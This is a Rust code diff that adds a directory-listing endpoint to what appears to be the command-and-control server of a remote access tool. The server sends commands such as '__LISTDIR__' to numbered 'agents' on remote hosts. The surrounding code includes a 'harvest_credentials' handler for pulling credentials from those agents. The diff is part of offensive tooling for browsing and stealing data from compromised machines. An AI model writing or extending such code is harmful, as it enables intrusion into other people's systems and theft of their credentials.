@@ -188,6 +188,37 @@ pub async fn upload_file(
     }
 }
 
+/// List directory contents from an agent
+pub async fn list_directory(
+    State(state): State<Arc<ApiState>>,
+    headers: HeaderMap,
+    Path(id): Path<u64>,
+    Json(request): Json<ListDirRequest>,
+) -> Result<Json<CommandResponse>, StatusCode> {
+    // Validate token
+    if let Some(token) = extract_token(&headers) {
+        if !state.validate_token(&token).await {
+            return Err(StatusCode::UNAUTHORIZED);
+        }
+    } else {
+        return Err(StatusCode::UNAUTHORIZED);
+    }
+    
+    let command = format!("__LISTDIR__:{}", request.path);
+    match state.send_command(id, command).await {
+        Ok(_) => Ok(Json(CommandResponse {
+            success: true,
+            message: format!("List directory request sent for: {}", request.path),
+            agent_id: id,
+        })),
+        Err(e) => Ok(Json(CommandResponse {
+            success: false,
+            message: e,
+            agent_id: id,
+        })),
+    }
+}
+
 /// Harvest credentials from an agent
 pub async fn harvest_credentials(
     State(state): State<Arc<ApiState>>,
